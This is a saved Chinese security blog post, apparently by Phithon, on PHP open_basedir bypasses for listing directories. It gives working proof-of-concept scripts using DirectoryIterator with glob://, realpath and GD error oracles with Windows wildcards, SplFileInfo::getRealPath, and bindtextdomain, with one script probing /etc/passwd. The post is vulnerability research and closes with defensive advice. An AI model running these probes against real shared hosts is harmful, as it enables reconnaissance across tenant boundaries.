@@ -1,0 +1,428 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./PHP绕过open_basedir列目录的研究  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./PHP绕过open_basedir列目录的研究  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./PHP绕过open_basedir列目录的研究  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>PHP绕过open_basedir列目录的研究 | 离别歌</title>
+<link href="./PHP绕过open_basedir列目录的研究  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./PHP绕过open_basedir列目录的研究  离别歌/styles.css" rel="stylesheet"/>
+<link href="./PHP绕过open_basedir列目录的研究  离别歌/style.css" rel="stylesheet"/>
+<link href="./PHP绕过open_basedir列目录的研究  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./PHP绕过open_basedir列目录的研究  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./PHP绕过open_basedir列目录的研究  离别歌/jquery.min.js"></script>
+<link href="./PHP绕过open_basedir列目录的研究  离别歌/code.css" rel="stylesheet"/>
+<link href="./PHP绕过open_basedir列目录的研究  离别歌/button.css" rel="stylesheet"/>
+<link href="./PHP绕过open_basedir列目录的研究  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./PHP绕过open_basedir列目录的研究  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html&amp;text=PHP%E7%BB%95%E8%BF%87open_basedir%E5%88%97%E7%9B%AE%E5%BD%95%E7%9A%84%E7%A0%94%E7%A9%B6"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html&amp;title=PHP%E7%BB%95%E8%BF%87open_basedir%E5%88%97%E7%9B%AE%E5%BD%95%E7%9A%84%E7%A0%94%E7%A9%B6"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html&amp;is_video=false&amp;description=PHP%E7%BB%95%E8%BF%87open_basedir%E5%88%97%E7%9B%AE%E5%BD%95%E7%9A%84%E7%A0%94%E7%A9%B6"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=PHP%E7%BB%95%E8%BF%87open_basedir%E5%88%97%E7%9B%AE%E5%BD%95%E7%9A%84%E7%A0%94%E7%A9%B6&amp;body=Check out this article: https%3A//www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html&amp;title=PHP%E7%BB%95%E8%BF%87open_basedir%E5%88%97%E7%9B%AE%E5%BD%95%E7%9A%84%E7%A0%94%E7%A9%B6"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html&amp;title=PHP%E7%BB%95%E8%BF%87open_basedir%E5%88%97%E7%9B%AE%E5%BD%95%E7%9A%84%E7%A0%94%E7%A9%B6"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html&amp;title=PHP%E7%BB%95%E8%BF%87open_basedir%E5%88%97%E7%9B%AE%E5%BD%95%E7%9A%84%E7%A0%94%E7%A9%B6"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html&amp;title=PHP%E7%BB%95%E8%BF%87open_basedir%E5%88%97%E7%9B%AE%E5%BD%95%E7%9A%84%E7%A0%94%E7%A9%B6"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html&amp;name=PHP%E7%BB%95%E8%BF%87open_basedir%E5%88%97%E7%9B%AE%E5%BD%95%E7%9A%84%E7%A0%94%E7%A9%B6&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">PHP绕过open_basedir列目录的研究</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2014年11月21日 17:28" itemprop="datePublished">
+                    2014 十一月 21 17:28
+                </time>
+</div>
+<div class="article-tag">
+            阅读：4390
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PHP">PHP</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/open_basedir">open_basedir</a>,
+                
+                <a class="tag-link" href="/tag/%E8%B7%A8%E7%9B%AE%E5%BD%95">跨目录</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>首发drops：<a href="http://drops.wooyun.org/tips/3978"><a href="http://drops.wooyun.org/tips/3978">http://drops.wooyun.org/tips/3978</a></a> 。</p>
+<p>近期由于在开发自己的webshell，所以对PHP一些已有的漏洞进行了一定的研究，并且也自己发现了部分PHP存在的安全隐患。这篇文章我来与大家分享一下自己对于PHP中open_basedir绕过并列举目录的方法总结。</p>
+<h2 id="0x01-open_basedir"><a class="toclink" href="#0x01-open_basedir">0x01 open_basedir的简介</a></h2>
+<p>Open_basedir是PHP设置中为了防御PHP跨目录进行文件（目录）读写的方法，所有PHP中有关文件读、写的函数都会经过open_basedir的检查。Open_basedir实际上是一些目录的集合，在定义了open_basedir以后，php可以读写的文件、目录都将被限制在这些目录中。</p>
+<p>设置open_basedir的方法，在linux下，不同的目录由“:”分割，如“/var/www/:/tmp/”；在Windows下不同目录由“;”分割，如“c:/www;c:/windows/temp”。</p>
+<p>在现在这个各种云、虚拟主机横行的时期，人们希望open_basedir作为一个横亘在不同用户之间的屏障，有力地保障用户的主机能独立运行，但事实并非人们想象的那么简单。</p>
+<p>我们这篇文章着重讲的将是绕过open_basedir进行目录的列举与遍历，为何我们不说具体文件的读、写，因为文件读写的洞是危害比较大的漏洞了，在php5.3以后很少有能够绕过open_basedir读写文件的方法。</p>
+<h2 id="0x02-directoryiterator-glob"><a class="toclink" href="#0x02-directoryiterator-glob">0x02 利用DirectoryIterator + Glob 直接列举目录</a></h2>
+<p>这是@/fd 脚本（<a href="http://zone.wooyun.org/content/11268"><a href="http://zone.wooyun.org/content/11268">http://zone.wooyun.org/content/11268</a></a>）里给出的第一个方法。</p>
+<p>DirectoryIterator 是php5中增加的一个类，为用户提供一个简单的查看目录的接口（The DirectoryIterator class provides a simple interface for viewing the contents of filesystem directories）。</p>
+<p>glob: 数据流包装器是从 PHP 5.3.0 起开始有效的，用来查找匹配的文件路径。</p>
+<p>结合这两个方式，我们就可以在php5.3以后对目录进行列举。在实测中，我们得知，此方法在Linux下列举目录居然可以无视open_basedir。</p>
+<p>实例代码：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nb">printf</span><span class="p">(</span><span class="s1">'&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;'</span><span class="p">,</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">));</span>
+<span class="nv">$file_list</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+<span class="c1">// normal files</span>
+<span class="nv">$it</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DirectoryIterator</span><span class="p">(</span><span class="s2">"glob:///*"</span><span class="p">);</span>
+<span class="k">foreach</span><span class="p">(</span><span class="nv">$it</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$file_list</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$f</span><span class="o">-&gt;</span><span class="na">__toString</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="c1">// special files (starting with a dot(.))</span>
+<span class="nv">$it</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DirectoryIterator</span><span class="p">(</span><span class="s2">"glob:///.*"</span><span class="p">);</span>
+<span class="k">foreach</span><span class="p">(</span><span class="nv">$it</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$file_list</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$f</span><span class="o">-&gt;</span><span class="na">__toString</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="nb">sort</span><span class="p">(</span><span class="nv">$file_list</span><span class="p">);</span>
+<span class="k">foreach</span><span class="p">(</span><span class="nv">$file_list</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">){</span>
+        <span class="k">echo</span> <span class="s2">"</span><span class="si">{</span><span class="nv">$f</span><span class="si">}</span><span class="s2">&lt;br/&gt;"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>执行我们可以发现，open_basedir为/usr/share/nginx/www/:/tmp/，但我们成功列举了/根目录下的所有文件：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201411/1b031416562447.png"><img alt="PHP绕过open_basedir列目录的研究1497.png" src="./PHP绕过open_basedir列目录的研究  离别歌/1b031416562447.png"/></a></p>
+<p>这个方法也是迄今为止最方便的方法，他不用暴力猜解目录，而是直接列举。但他对php版本、系统版本有一定要求，在5.3以上可列举（5.5/5.6可能会有修复？在官方没看到有fix），需要在Linux下才能绕过open_basedir。</p>
+<h2 id="0x03-realpath"><a class="toclink" href="#0x03-realpath">0x03 realpath列举目录</a></h2>
+<p>这是@/fd 脚本（<a href="http://zone.wooyun.org/content/11268"><a href="http://zone.wooyun.org/content/11268">http://zone.wooyun.org/content/11268</a></a>）里给出的第二个方法。</p>
+<p>Realpath函数是php中将一个路径规范化成为绝对路径的方法，它可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径。</p>
+<p>在开启了open_basedir以后，这个函数有个特点：当我们传入的路径是一个不存在的文件（目录）时，它将返回false；当我们传入一个不在open_basedir里的文件（目录）时，他将抛出错误（File is not within the allowed path(s)）。</p>
+<p>所以我们可以通过这个特点，来进行目录的猜解。举个例子，我们需要猜解根目录（不在open_basedir中）下的所有文件，只用写一个捕捉php错误的函数err_handle()。当猜解某个存在的文件时，会因抛出错误而进入err_handle()，当猜解某个不存在的文件时，将不会进入err_handle()。</p>
+<p>那么由此我们来算算效率。假如一个文件名长度为6位（如config、passwd等全小写不带数字）的文件，我们最差需要枚举多少次才能猜测到他是否存在：</p>
+<p><code>26 ** 6 = 308915776次</code></p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201411/bc9b1416562449.png"><img alt="PHP绕过open_basedir列目录的研究2150.png" src="./PHP绕过open_basedir列目录的研究  离别歌/bc9b1416562449.png"/></a></p>
+<p>这样是需要跑很久的，基本每次跑的时候我都没耐心了，这样暴力猜解肯定是不行的。那么，有什么好办法可以变这个“鸡肋”的漏洞为一个“好用”的漏洞？</p>
+<p>熟悉Windows + PHP的同学应该还记得Windows下有两个特殊的通配符：&lt;、&gt;</p>
+<p>对，我们这里就借用这些通配符的力量来列举目录。写个简单的POC来列举一下：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">,</span> <span class="nb">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">));</span>
+<span class="nb">printf</span><span class="p">(</span><span class="s2">"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;"</span><span class="p">,</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">));</span>
+<span class="nb">set_error_handler</span><span class="p">(</span><span class="s1">'isexists'</span><span class="p">);</span>
+<span class="nv">$dir</span> <span class="o">=</span> <span class="s1">'d:/test/'</span><span class="p">;</span>
+<span class="nv">$file</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$chars</span> <span class="o">=</span> <span class="s1">'abcdefghijklmnopqrstuvwxyz0123456789_'</span><span class="p">;</span>
+<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
+    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="o">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s1">'&lt;&gt;&lt;'</span><span class="p">;</span>
+    <span class="nb">realpath</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="nf">isexists</span><span class="p">(</span><span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$regexp</span> <span class="o">=</span> <span class="s1">'/File\((.*)\) is not within/'</span><span class="p">;</span>
+    <span class="nb">preg_match</span><span class="p">(</span><span class="nv">$regexp</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="nb">printf</span><span class="p">(</span><span class="s2">"%s &lt;br/&gt;"</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>首先设置open_basedir为当前目录，并枚举d:/test/目录下的所有文件。将错误处理交给isexists函数，在isexists函数中匹配出目录名称，并打印出来。</p>
+<p>执行可以看到：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201411/51cf1416562451.png"><img alt="PHP绕过open_basedir列目录的研究2934.png" src="./PHP绕过open_basedir列目录的研究  离别歌/51cf1416562451.png"/></a></p>
+<p>Open_basedir为c:\wamp\www，但我们列举出了d:/test/目录下的文件。</p>
+<p>当然，这是个很粗糙的POC，因为我并没有考虑到首字母相同的文件，所以这个POC只能列举首字母不同的文件。</p>
+<p>如果首字母相同，我们只需要再枚举第二个字符、第三个字符依次类推，即可列举出目录中所有文件。</p>
+<p>这个方法好处是windows下php所有版本通用，当然坏处就是只有windows下才能使用通配符，如果是linux下就只能暴力猜解了。</p>
+<h2 id="0x04-splfileinfogetrealpath"><a class="toclink" href="#0x04-splfileinfogetrealpath">0x04 SplFileInfo::getRealPath列举目录</a></h2>
+<p>受到上一个方法的启发，我开始在php中寻找类似的方法。一旦realpath不能使用的情况下，也能找到替代方式。</p>
+<p>我找到了新方法：<a href="http://www.wooyun.org/bugs/wooyun-2010-083453"><a href="http://www.wooyun.org/bugs/wooyun-2010-083453">http://www.wooyun.org/bugs/wooyun-2010-083453</a></a> ，使用的方式是SplFileInfo::getRealPath。</p>
+<p>SplFileInfo类是PHP5.1.2之后引入的一个类，提供一个对文件进行操作的接口。其中有一个和realpath名字很像的方法叫getRealPath。</p>
+<p>这个方法功能和realpath类似，都是获取绝对路径用的。我们在SplFileInfo的构造函数中传入文件相对路径，并且调用getRealPath即可获取文件的绝对路径。</p>
+<p>这个方法有个特点：完全没有考虑open_basedir。在传入的路径为一个不存在的路径时，会返回false；在传入的路径为一个存在的路径时，会正常返回绝对路径。</p>
+<p>我们的realpath函数还是考虑了open_basedir，只是在报错上没有考虑周全导致我们能够判断某个文件是否存在。但我们可爱的SplFileInfo::getRealPath方法是直接没有考虑open_basedir，就能够判断一个文件是否存在。</p>
+<p>那么，我给出一个POC：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">,</span> <span class="nb">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">));</span>
+<span class="nb">printf</span><span class="p">(</span><span class="s2">"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;"</span><span class="p">,</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">));</span>
+<span class="nv">$basedir</span> <span class="o">=</span> <span class="s1">'D:/test/'</span><span class="p">;</span>
+<span class="nv">$arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+<span class="nv">$chars</span> <span class="o">=</span> <span class="s1">'abcdefghijklmnopqrstuvwxyz0123456789'</span><span class="p">;</span>
+<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
+    <span class="nv">$info</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SplFileInfo</span><span class="p">(</span><span class="nv">$basedir</span> <span class="o">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s1">'&lt;&gt;&lt;'</span><span class="p">);</span>
+    <span class="nv">$re</span> <span class="o">=</span> <span class="nv">$info</span><span class="o">-&gt;</span><span class="na">getRealPath</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$re</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">dump</span><span class="p">(</span><span class="nv">$re</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="nf">dump</span><span class="p">(</span><span class="nv">$s</span><span class="p">){</span>
+    <span class="k">echo</span> <span class="nv">$s</span> <span class="o">.</span> <span class="s1">'&lt;br/&gt;'</span><span class="p">;</span>
+    <span class="nb">ob_flush</span><span class="p">();</span>
+    <span class="nb">flush</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>只是把之前的POC稍作修改，同样列出了D:/test下的文件：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201411/3b001416562455.png"><img alt="PHP绕过open_basedir列目录的研究4269.png" src="./PHP绕过open_basedir列目录的研究  离别歌/3b001416562455.png"/></a></p>
+<p>这个方法有个特点，不管是否开启open_basedir都是可以枚举任意目录的。而上一个方法（realpath）只有在开启open_basedir且在open_basedir外的时候才会报错，才能列举目录。当然，没有开启open_basedir的时候也不需要这样列举目录了。</p>
+<h2 id="0x05-gdimageftbboximagefttext"><a class="toclink" href="#0x05-gdimageftbboximagefttext">0x05 GD库imageftbbox/imagefttext列举目录</a></h2>
+<p>GD库一般是PHP必备的扩展库之一，所以我在寻找open_basedir的时候也会看看这些有用的扩展库。</p>
+<p>这是新方法：<a href="http://www.wooyun.org/bugs/wooyun-2010-083688"><a href="http://www.wooyun.org/bugs/wooyun-2010-083688">http://www.wooyun.org/bugs/wooyun-2010-083688</a> </a></p>
+<p>我拿imageftbbox举个例子，这个函数第三个参数是字体的路径。我发现当这个参数在open_basedir外的时候，当文件存在，则php会抛出“File(xxxxx) is not within the allowed path(s)”错误。但当文件不存在的时候会抛出“Invalid font filename”错误。</p>
+<p>也就是说，我们可以通过抛出错误的具体内容来判断一个文件是否存在。这个方法和realpath有相似性，都会抛出open_basedir的错误。</p>
+<p>我也修改了个简单的POC：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">,</span> <span class="nb">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">));</span>
+<span class="nb">printf</span><span class="p">(</span><span class="s2">"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;"</span><span class="p">,</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">));</span>
+<span class="nb">set_error_handler</span><span class="p">(</span><span class="s1">'isexists'</span><span class="p">);</span>
+<span class="nv">$dir</span> <span class="o">=</span> <span class="s1">'d:/test/'</span><span class="p">;</span>
+<span class="nv">$file</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$chars</span> <span class="o">=</span> <span class="s1">'abcdefghijklmnopqrstuvwxyz0123456789_'</span><span class="p">;</span>
+<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
+    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="o">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s1">'&lt;&gt;&lt;'</span><span class="p">;</span>
+    <span class="c1">//$m = imagecreatefrompng("zip.png");</span>
+    <span class="c1">//imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, 'aaa');</span>
+    <span class="nb">imageftbbox</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="nv">$file</span><span class="p">,</span> <span class="s1">'aaa'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="nf">isexists</span><span class="p">(</span><span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">global</span> <span class="nv">$file</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">stripos</span><span class="p">(</span><span class="nv">$errstr</span><span class="p">,</span> <span class="s1">'Invalid font filename'</span><span class="p">)</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nb">printf</span><span class="p">(</span><span class="s2">"%s&lt;br/&gt;"</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>同样列举一下d:/test</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201411/092c1416562456.png"><img alt="PHP绕过open_basedir列目录的研究5469.png" src="./PHP绕过open_basedir列目录的研究  离别歌/092c1416562456.png"/></a></p>
+<p>如上图，我们发现虽然“通配符”在判断是否存在的时候奏效了，但我们真正的文件名并没有显示出来，而是还是以通配符“&lt;&gt;&lt;”代替。</p>
+<p>所以，这个方法报错的时候并不会把真正的路径爆出来，这也是其与realpath的最大不同之处。所以，我们只能一位一位地猜测，但总体来说，还是能够猜测出来的，只不过可能比realpath更麻烦一些罢了。</p>
+<h2 id="0x06-bindtextdomain"><a class="toclink" href="#0x06-bindtextdomain">0x06 bindtextdomain暴力猜解目录</a></h2>
+<p>这是新方法：<a href="http://www.wooyun.org/bugs/wooyun-2010-083457"><a href="http://www.wooyun.org/bugs/wooyun-2010-083457">http://www.wooyun.org/bugs/wooyun-2010-083457</a> </a></p>
+<p>bindtextdomain是php下绑定domain到某个目录的函数。具体这个domain是什么我也没具体用过，只是在一些l10n应用中可能用到的方法（相关函数textdomain、gettext、setlocale，说明：<a href="http://php.net/manual/en/function.gettext.php">http://php.net/manual/en/function.gettext.php</a>）</p>
+<p>Bindtextdomain函数在环境支持Gettext Functions的时候才能使用，而我的windows环境下是没有bindtextdomain函数的，我的linux环境是默认存在这个函数。</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201411/9ee71416562458.png"><img alt="PHP绕过open_basedir列目录的研究6098.png" src="./PHP绕过open_basedir列目录的研究  离别歌/9ee71416562458.png"/></a></p>
+<p>如上图，这个函数第二个参数<code>$directory</code>是一个文件路径。它会在<code>$directory</code>存在的时候返回<code>$directory</code>，不存在则返回false。</p>
+<p>写个简单的测试代码：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nb">printf</span><span class="p">(</span><span class="s1">'&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;'</span><span class="p">,</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">));</span>
+<span class="nv">$re</span> <span class="o">=</span> <span class="nb">bindtextdomain</span><span class="p">(</span><span class="s1">'xxx'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'dir'</span><span class="p">]);</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$re</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>当/etc/passwd存在的时候输出之：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201411/b05b1416562461.png"><img alt="PHP绕过open_basedir列目录的研究6343.png" src="./PHP绕过open_basedir列目录的研究  离别歌/b05b1416562461.png"/></a></p>
+<p>当/etc/wooyun不存在的时候返回false：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201411/5ae51416562463.png"><img alt="PHP绕过open_basedir列目录的研究6373.png" src="./PHP绕过open_basedir列目录的研究  离别歌/5ae51416562463.png"/></a></p>
+<p>并没有考虑到open_basedir。所以，我们也可以通过返回值的不同来猜解、列举某个目录。</p>
+<p>但很大的鸡肋点在，windows下默认是没有这个函数的，而在linux下不能使用通配符进行目录的猜解，所以显得很鸡肋。</p>
+<p>当然，在万无退路的时候进行暴力猜解目录，也不失为一个还算行的方法。</p>
+<h2 id="0x07"><a class="toclink" href="#0x07">0x07 总结</a></h2>
+<p>open_basedir本来作为php限制跨目录读写文件的最基础的方式，应该需要进行完好的设计。但可能php在当初编写代码的时候并没有进行一个统一的设计，导致每当新增加功能或遇到一些偏僻的函数的时候，都会出现类似“open_basedir绕过”等悲剧。</p>
+<p>我曾经写过一篇文章，《lnmp虚拟主机安全配置研究》，中讲述了一个防止虚拟主机跨目录的方法。但受到了一些白帽子的质疑：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201411/6a2c1416562464.png"><img alt="PHP绕过open_basedir列目录的研究6713.png" src="./PHP绕过open_basedir列目录的研究  离别歌/6a2c1416562464.png"/></a></p>
+<p>原因是很多人过于相信open_basedir的可靠性。open_basedir固然是一个简单地限制跨目录的方法，但如果过于依赖某一个方法去防御一类攻击，你将会死的很惨。</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201411/c6551416562465.png"><img alt="PHP绕过open_basedir列目录的研究6800.png" src="./PHP绕过open_basedir列目录的研究  离别歌/c6551416562465.png"/></a></p>
+<p>open_basedir绕过方法固然有版本局限，但不排除有很多人手中握着0day。像我这样对php造诣并不算高的菜鸟也能找到的open_basedir绕过漏洞，你真的能保证大牛们都没有办法绕过么？</p>
+<p>我当然更能相信linux/windows等操作系统自带的权限控制机制，也不会单单相信open_basedir真的能帮我防御什么。</p>
+<p>By the way，我上面提到的这些方法，基本都还没有在php的最新版修复（甚至是我自己发现的“0day”），也就是说还真的有这么多通用的方法可以绕过open_basedir。</p>
